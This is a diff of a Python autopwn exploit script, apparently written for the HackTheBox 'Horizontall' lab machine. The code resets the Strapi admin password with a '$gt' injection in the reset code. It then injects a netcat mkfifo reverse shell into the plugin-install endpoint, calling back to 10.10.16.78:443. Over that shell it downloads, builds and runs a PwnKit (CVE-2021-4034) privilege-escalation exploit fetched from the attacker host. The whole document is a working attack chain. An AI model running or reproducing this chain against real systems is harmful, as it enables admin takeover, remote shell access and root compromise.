@@ -34,55 +34,59 @@ signal.signal(signal.SIGINT, def_handler)
 
 class Exploit:
 
-    def __init__(self, main_url, password, filename):
-        self.url = main_url
-	self.password = password
-	self.filename = filename
+	def __init__(self, main_url, password, filename):
 
-    def zip_file(self):
-	os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
-	git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
-	cwd = os.getcwd()
-	shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)
+		self.__url = main_url
+		self.__password = password
+		self.__filename = filename
 
-    def reset_password(self):
-	s = requests.session()
-	s.verify = False
-	urllib3.disable_warnings()
+	def zip_file(self):
+		os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
+		git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
+		cwd = os.getcwd()
+		shutil.make_archive(self.__filename, 'zip', cwd+'/'+self.__filename)
 
-	p1 = log.progress('Password')
+	def reset_password(self):
 
-	data_password = {
-		'code': {'$gt':0},
-		'password': self.password,
-		'passwordConfirmation': self.password
-	}
+		s = requests.session()
+		s.verify = False
+		urllib3.disable_warnings()
 
-	r = s.post(self.url+'/admin/auth/reset-password', json=data_password).text
+		p1 = log.progress('Password')
 
-	response = json.loads(r)
-	global jwt
+		data_password = {
+			'code': {'$gt':0},
+			'password': self.__password,
+			'passwordConfirmation': self.__password
+		}
 
-	jwt = response['jwt']
+		r = s.post(self.__url+'/admin/auth/reset-password', json=data_password).text
 
-	if 'jwt' not in r:
-		p1.failure('Not changed password')
-		sys.exit(1)
-	else:
-		p1.success(f'[Changed password] username admin and password {self.password}')
+		response = json.loads(r)
+		global jwt
 
-    def rce_starpi(self):
+		jwt = response['jwt']
 
-	header = { 'Authorization': f'Bearer {jwt}' }
+		if 'jwt' not in r:
+			p1.failure('Not changed password')
+			sys.exit(1)
+		else:
+			p1.success(f'[Changed password] username admin and password {self.__password}')
+
+	def rce_starpi(self):
+
+		header = { 'Authorization': f'Bearer {jwt}' }
 		
-	# Cambiar IP por la vuestra
+		# Cambiar IP por la vuestra
 
-	data_plugin = {
-		'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.70 443 >/tmp/f)',
-		'port': '1337'
-	}
+		data_plugin = {
+			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.78 443 >/tmp/f)',
+			'port': '1337'
+		}
 
-	r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)
+		r = requests.post(self.__url+'/admin/plugins/install', json=data_plugin, headers=header)
+
+		print(r.text)
 
 autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')
 
@@ -91,6 +95,8 @@ def main():
 	autopwn.reset_password()
 	autopwn.rce_starpi()
 	
+	
+
 if __name__ == '__main__':
 	try:
 		threading.Thread(target=main, args=()).start()
@@ -99,8 +105,9 @@ if __name__ == '__main__':
 
 shell = listen(443, timeout=20).wait_for_connection()
 # Cambiar IP por la vuestra
-shell.sendline('cd /tmp; wget http://10.10.16.70:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
+shell.sendline('cd /tmp; wget http://10.10.16.78:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
 shell.interactive()
+
 ```
 
 <p> </p>
